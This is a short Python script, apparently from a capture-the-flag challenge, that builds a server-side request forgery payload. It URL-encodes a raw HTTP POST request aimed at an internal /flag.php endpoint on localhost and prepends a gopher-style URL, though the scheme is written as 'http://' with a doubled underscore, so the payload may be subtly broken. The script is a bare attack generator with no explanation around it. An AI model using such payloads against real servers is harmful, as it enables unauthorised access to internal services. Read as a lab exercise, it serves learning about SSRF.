import urllib.parse

test = """POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

givemeflag=yes
"""

gopher = "http://127.0.0.1:80/_"

payload = gopher + "_" + urllib.parse.quote(test)
print(payload)